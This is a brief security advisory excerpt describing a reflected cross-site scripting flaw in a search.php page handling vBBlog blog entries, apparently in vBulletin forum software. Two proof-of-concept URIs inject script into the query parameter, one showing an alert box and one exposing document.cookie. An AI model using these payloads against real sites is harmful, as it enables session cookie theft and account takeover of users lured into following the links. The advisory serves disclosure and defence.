Attackers can exploit this issue by enticing an unsuspecting victim to follow a malicious URI.

The following example URIs are available:

http://www.example.com/path/search.php?search_type=1&amp;contenttype=vBBlog_BlogEntry&amp;query="&gt;&lt;script&gt;alert('xss');&lt;/script&gt;

http://www.example.com/path/search.php?search_type=1&amp;contenttype=vBBlog_BlogEntry&amp;query="&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
